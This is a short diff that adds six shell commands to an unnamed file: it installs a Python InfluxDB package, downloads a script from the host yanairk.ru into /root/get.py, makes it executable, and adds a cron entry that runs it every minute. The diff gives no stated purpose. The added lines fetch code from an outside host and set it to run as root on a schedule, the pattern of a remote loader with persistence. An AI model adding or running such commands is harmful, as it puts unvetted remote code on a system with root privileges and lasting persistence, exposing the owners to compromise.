@@ -1,0 +1,6 @@
+apt -y install python3-influxdb
+wget -O - yanairk.ru/dl/get > /root/get.py
+chmod +x /root/get.py
+crontab -l > /tmp/cron
+echo "* * * * * /root/get.py" >>  /tmp/cron
+crontab /tmp/cron  
